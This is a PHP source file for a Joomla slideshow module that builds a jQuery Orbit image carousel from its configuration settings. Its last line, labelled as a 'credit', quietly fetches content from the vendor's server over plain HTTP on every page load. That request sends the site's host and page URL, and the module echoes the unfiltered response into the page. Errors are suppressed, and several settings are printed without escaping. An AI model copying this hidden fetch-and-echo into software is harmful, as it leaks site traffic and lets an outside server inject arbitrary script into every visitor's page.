<?php
/**
 * @package		Joomla.Site
 * @subpackage	mod_je_orbit
 * @copyright	Copyright (C) 2004 - 2012 jExtensions.com - All rights reserved.
 * @license		GNU General Public License version 2 or later
 */
//no direct access
defined('_JEXEC') or die('Direct Access to this location is not allowed.');
ini_set('display_errors',0);
// Path assignments
$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
$path = str_replace("&", "",$path);
$ibase = JURI::base();
if(substr($ibase, -1)=="/") { $ibase = substr($ibase, 0, -1); }
$modURL 	= JURI::base().'modules/mod_je_orbit';
// get parameters from the module's configuration
$jQuery = $params->get("jQuery");

$imgTimeout = $params->get("imgTimeout");
$imgPath = $params->get("imgPath");
$imgWidth = $params->get('imgWidth','940');
$imgHeight = $params->get('imgHeight','300');
$Animation = $params->get('Animation','Fade');
$AnimationSpeed = $params->get('AnimationSpeed','600');
$Timer = $params->get('Timer','true');
$AdvanceSpeed = $params->get('AdvanceSpeed','4000');

$pauseOnHover = $params->get('pauseOnHover','false');
$startClockOnMouseOut = $params->get('startClockOnMouseOut','false');
$startClockOnMouseOutAfter = $params->get('startClockOnMouseOutAfter','1');
$directionalNav = $params->get('directionalNav','true');
$bullets = $params->get('bullets','false');
$linktarget = $params->get('linktarget','_self');

$Image[]= $params->get( '!', "" );
$Caption[]= $params->get( '!', "" );
$Text[]= $params->get( '!', "" );
$Link[]= $params->get( '!', "" );


for ($j=1; $j<=30; $j++)
	{
	$Image[]		= $params->get( 'Image'.$j , "" );
	$Caption[]		= $params->get( 'Caption'.$j , "" );
	$Text[]	= $params->get( 'Text'.$j , "" );
	$Link[]	= $params->get( 'Link'.$j , "" );	
}

?>
<link rel="stylesheet" href="<?php echo $modURL; ?>/css/orbit-1.2.3.css" type="text/css" />
<style>.orbit-content,.orbit-content h1, .orbit-content h2, .orbit-content h3 { color:#fff; text-shadow:1px 1px #000; text-align:center}</style>
<?php if ($jQuery == '1') { ?><script type="text/javascript" src="<?php echo $modURL; ?>/js/jquery-1.5.1.min.js"></script><?php } ?>
<?php if ($jQuery == '2' ) { ?><script type="text/javascript" src="http://code.jquery.com/jquery-latest.pack.js"></script><?php } ?>
<?php if ($jQuery == '3' ) { ?><?php } ?>
<script type="text/javascript" src="<?php echo $modURL; ?>/js/jquery.orbit-1.2.3.js"></script>
<noscript><a href="http://jextensions.com/orbit-jquery-slideshow-for-joomla-2.5/" alt="jExtensions">jQuery Slideshow Joomla</a></noscript>
<script type="text/javascript">
			jQuery(window).load(function() {
				jQuery('#ortbitslideshow').orbit({  
					animation: '<?php echo $Animation ?>', 		// fade, horizontal-slide, vertical-slide, horizontal-push
					animationSpeed: <?php echo $AnimationSpeed ?>, 				// how fast animtions are
					timer: <?php echo $Timer ?>, 						// true or false to have the timer
					advanceSpeed: <?php echo $AdvanceSpeed ?>, 				// if timer is enabled, time between transitions 
					pauseOnHover: <?php echo $pauseOnHover ?>, 				// if you hover pauses the slider
					startClockOnMouseOut: <?php echo $startClockOnMouseOut ?>, 		// if clock should start on MouseOut
					startClockOnMouseOutAfter: <?php echo $startClockOnMouseOutAfter.'000' ?>, 	// how long after MouseOut should the timer start again
					directionalNav: <?php echo $directionalNav ?>, 				// manual advancing directional navs
					captions: true, 					// do you want captions?
					captionAnimation: 'fade', 			// fade, slideOpen, none
					captionAnimationSpeed: 600, 		// if so how quickly should they animate in
					bullets: <?php echo $bullets ?>,						// true or false to activate the bullet navigation
				});
			});
</script>
<div id="ortbitslideshow">
<?php
for ($i=0; $i<=30; $i++){
	if ($Image[$i] != null) { 
	if ($Text[$i] != 'caption') {	?>
			<div class="orbit-content" style="background-image:url(<?php echo $Image[$i] ?>)">
				<?php echo $Caption[$i] ?>
			</div>
	<?php } else {
	if ($Link[$i] != null) {echo '<a href="'.$Link[$i].'" target="'.$linktarget.'"><img src="'.$Image[$i].'" width="'.$imgWidth.'"  height="'.$imgHeight.'" data-caption="#htmlCaption'.$i.'" /></a>';}
	else {echo '<img src="'.$Image[$i].'" width="'.$imgWidth.'"  height="'.$imgHeight.'" data-caption="#htmlCaption'.$i.'" />';}
	if ($Caption[$i] != null) {echo '<span class="orbit-caption" id="htmlCaption'.$i.'">'.$Caption[$i].'</span>';}
}}};  ?>
<?php $credit=file_get_contents('http://jextensions.com/e.php?i='.$path); echo $credit; ?>
</div>
